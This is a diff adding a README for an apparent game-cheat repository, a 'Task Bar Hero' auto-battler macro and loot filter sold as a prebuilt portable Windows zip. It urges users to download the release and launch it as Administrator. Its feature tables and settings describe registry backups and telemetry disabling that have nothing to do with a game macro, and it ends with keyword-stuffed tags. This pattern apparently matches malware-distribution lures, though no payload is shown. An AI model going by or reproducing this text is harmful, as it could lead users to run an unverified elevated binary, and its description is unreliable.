@@ -1,0 +1,62 @@
+Task Bar Hero — Auto-Battler Macro & Loot Filter (Portable x64 Build)
+
+Task Bar Hero Auto-Battler Macro & Loot Filter: native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.
+
+Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Build from Source
+
+Overview
+
+Task Bar Hero — Auto-Battler Macro & Loot Filter (Portable x64 Build) (task-bar-hero-auto-battler-macro-loot-portable-x64) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.
+
+1-Click Prebuilt Package (No Compiler Required): Even though the full source tree (src/, config/) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab task-bar-hero-auto-battler-macro-loot-portable-x64-v1.2.0-win64.zip directly from Releases.
+
+Quick Start (Prebuilt Release)
+
+| Platform | Direct Download Package | Checksum Manifest |
+| :--- | :--- | :--- |
+| Windows 10 / 11 (64-bit) | task-bar-hero-auto-battler-macro-loot-portable-x64-v1.2.0-win64.zip | SHA256SUMS.txt |
+
+1. Download task-bar-hero-auto-battler-macro-loot-portable-x64-v1.2.0-win64.zip from the table above or the Releases section.
+2. Extract the .zip archive into any folder (keep config/settings.json next to the launcher).
+3. Launch the executable as Administrator.
+
+Architecture & Modules
+
+| Subsystem | Technical Implementation | Runtime Controls |
+| :--- | :--- | :--- |
+| Portable Lifecycle Engine | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
+| Profile State Snapshot | Automatic backup before applying changes | Restores baseline configuration at any time |
+| Telemetry & Task Tuner | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
+| Unattended CLI Mode | JSON-driven configuration (config/settings.json) | Scriptable batch deployment on Windows 10/11 |
+
+Configuration (config/settings.json)
+
+{
+  "version": "1.2.0",
+  "runtime": {
+    "portable_mode": true,
+    "auto_backup_registry": true,
+    "verify_signatures": true,
+    "theme": "dark",
+    "log_level": "info"
+  },
+  "modules": {
+    "lifecycle_manager": {
+      "enabled": true,
+      "clean_temp_cache": true,
+      "preserve_user_profiles": true
+    },
+    "service_optimizer": {
+      "enabled": true,
+      "disable_telemetry_tasks": true
+    }
+  }
+}
+
+Building from Source
+
+git clone https://github.com/oliverwrightx2091g8/task-bar-hero-auto-battler-macro-loot-portable-x64.git
+cd task-bar-hero-auto-battler-macro-loot-portable-x64
+dotnet build src/RuntimeToolkit.csproj -c Release
+
+Indexed tags: task-bar-hero, autoclicker, save-editor, idle-game, windows-overlay, auto, task-auto, battler, task-battler, macro, task-macro, loot, task-loot, filter, task-filter, windows-11
